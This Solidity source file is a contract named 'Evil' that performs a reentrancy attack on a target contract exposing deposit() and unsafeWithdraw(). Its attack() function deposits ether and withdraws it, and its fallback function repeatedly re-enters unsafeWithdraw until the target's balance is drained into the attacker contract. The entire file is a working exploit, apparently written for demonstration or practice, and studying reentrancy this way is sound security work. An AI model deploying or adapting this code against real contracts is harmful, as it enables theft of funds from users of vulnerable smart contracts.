// SPDX-License-Identifier: MIT
pragma solidity >=0.4.22 <0.8.0;

interface AttackTarget {
    function deposit() external payable;

    function unsafeWithdraw() external;
}

contract Evil {
    AttackTarget public _attackTargetAddr;

    function setAttackTarget(address attackAddr) external {
        _attackTargetAddr = AttackTarget(attackAddr);
    }

    fallback() external payable {
        if (address(_attackTargetAddr).balance > 0) {
            _attackTargetAddr.unsafeWithdraw();
        }
    }

    function attack() external payable {
        _attackTargetAddr.deposit{value: msg.value}();
        _attackTargetAddr.unsafeWithdraw();
    }

    function getStoredSavings() public view returns (uint256) {
        return address(this).balance;
    }
}
